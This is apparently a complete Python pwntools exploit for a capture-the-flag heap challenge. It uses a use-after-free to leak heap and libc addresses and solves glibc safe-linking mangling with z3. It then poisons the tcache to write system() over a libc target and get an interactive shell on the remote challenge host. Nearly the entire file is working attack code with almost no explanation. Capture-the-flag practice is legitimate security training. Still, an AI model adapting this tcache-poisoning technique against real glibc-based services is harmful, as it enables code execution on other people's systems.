from pwn import *
from z3 import *
import builtins
import atexit

def sendlineafter(delim: bytes, val):
    p.recvuntil(delim)
    match type(val):
        case builtins.int | builtins.float | builtins.str:
            p.sendline(f"{val}".encode())
        case builtins.bytes:
            p.sendline(val)

def make(size: int, data: bytes, idx=True, lim=True):
    sendlineafter(b": ", 1)
    sendlineafter(b": ", size)

    if lim:
        data = data.ljust(size, b"\x00")

    sendlineafter(b": ", data)
    if idx:
        p.recvuntil(b"to index: ")
        return int(p.recvuntil(b".\n", drop=True), 0)

def free(idx: int):
    sendlineafter(b": ", 2)
    sendlineafter(b": ", idx)

def view():
    sendlineafter(b": ", 3)
    leaks = dict()
    while (r := p.recv(1)) == b"I":
        p.recvuntil(b"ndex ")
        idx = int(p.recvuntil(b": ", drop=True))
        leaks[idx] = p.recvline(keepends=False)
    return leaks

libc = ELF("./libc.so.6")
context.binary = file = ELF("./chall")
context.terminal = ["kitty"]
gdbscript = f"""
c
"""

if args.REMOTE:
    p = remote("0.cloud.chals.io", "30126")
elif args.GDB:
    p = remote("localhost", 1024)
    p.recv(1)
    open("gdbscript", "w+").write(gdbscript)
    g = process("kitty gdb -p $(pgrep chall) -x gdbscript ./chall", shell=True)
    atexit.register(lambda: g.close())
    sleep(2)

meh = b"ABCDEFGH"

size = 0x500
actual = 0x790

a = make(0x10, b"")         # data_array[0] = { .data = ptr, .size = 0x10 }
free(a)                     # data_array[0] = { .data = ptr, .size = 0x00 }
assert a == make(0x10, b"") # data_array[0] = { .data = ptr, .size = 0x10 }

b = make(0x10, b"")         # data_array[1] = { .data = ptr, .size = 0x10 }
d = make(0x3d0, b"")        # <-- setup for later
c = make(0x10, b"")         # <-- setup for later

free(c)                     # <-- setup for later
free(a)                     # data_array[0] = .{ .data = freed(ptr), .size = 0x00 }
                            # data_array[1] = .{ .data = freed(ptr), .size = 0x10 }

leak = u64(view()[1].ljust(8, b"\x00"))
log.info(f"{leak = :#x}")   # leak data_array[1] since size is non-zero

s = Solver() # im lazy so use z3
base = BitVec('base', 64)
addr = BitVec('addr', 64)
next = BitVec('next', 64)
s.add(addr == base + 0x2a0)
s.add(next ^ (addr >> 12) == leak)
s.add(next & 0xFFF == 0xab0)
s.add(next == base + 0xab0)

print(s.check())
heapbase = s.model()[base].as_long()
mangle = heapbase >> 12
log.info(f"{heapbase = :#x}")

assert a == make(0x10, p64((heapbase + 0x30 + 0x80 + 0x10) ^ mangle))
assert c == make(0x10, b"")

e = make(0x10, b"")
f = make(0x10, b"")

free(d)
free(c)
free(a)

assert a == make(0x10, p64((heapbase + 0x320) ^ mangle))
assert d == make(0x10, b"", lim=False)
assert c == make(0x10, b"")

g = make(0x10, b"")
h = make(0x10, b"")

leak = u64(view()[5].ljust(8, b"\x00"))
log.info(f"{leak = :#x}")
leak = leak ^ mangle
log.info(f"{leak = :#x}")
if args.GDB:
    guess = int(input("guess: "), 16)
else:
    guess = 5
leak = (leak & ~0xFFFF) | 0xd00 | (guess << 12)
libcbase = leak - 0x1d7d00
log.info(f"{leak = :#x}")
log.info(f"{libcbase = :#x}")

target = libcbase + 0x1d7000 + 0x70

free(c)
free(a)

assert a == make(0x10, p64(target ^ mangle))
assert c == make(0x10, b"")

i = make(0x10, b"sh\x00")
system = libcbase + libc.sym.system
log.info(f"{system = :#x}")
j = make(0x20, p64(0) + p64(system))

sendlineafter(b": ", 3)

p.interactive()